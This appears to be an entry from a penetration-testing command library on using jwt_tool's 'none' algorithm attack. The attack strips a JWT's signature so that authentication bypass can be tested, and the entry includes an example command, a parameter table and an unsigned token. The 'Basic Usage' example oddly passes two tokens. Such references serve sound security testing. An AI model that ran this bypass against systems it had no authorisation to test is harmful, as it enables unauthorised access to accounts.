---
type: command
executor: bash
data: python3 jwt_tool.py $_ORIGINAL_TOKEN -X n
output: null
platforms:
  - Linux
  - macOS
tags:
  - jwt
  - token-tamper
  - exploitation
verified: true
validated: true
---

# jwt-tool-tamper-to-null

## Command

```bash
python3 jwt_tool.py $_ORIGINAL_TOKEN -X n
```

## Description

Uses jwt_tool to tamper an existing JWT by changing the algorithm to 'none' and removing the signature, creating an unsigned token for authentication bypass testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ORIGINAL_TOKEN | Path to or the string of the original JWT token | Yes |
| -X n | Flag to perform the 'none' algorithm attack (removes signature) | Built-in |

## Examples

### Basic Usage

```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIs... $_ORIGINAL_TOKEN -X n
```

### Advanced Usage

Output to file:

```bash
python3 jwt_tool.py $_ORIGINAL_TOKEN -X n > tampered_token.txt
```

## Expected Output

Tampered token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyIiwiaWF0IjoxNTE2MjM5MDIyfQ.

Followed by tool summary of the attack applied.

## Related

- [[procedures/jwt-null-signature-authentication-bypass]]
- [[tools/jwt_tool]]
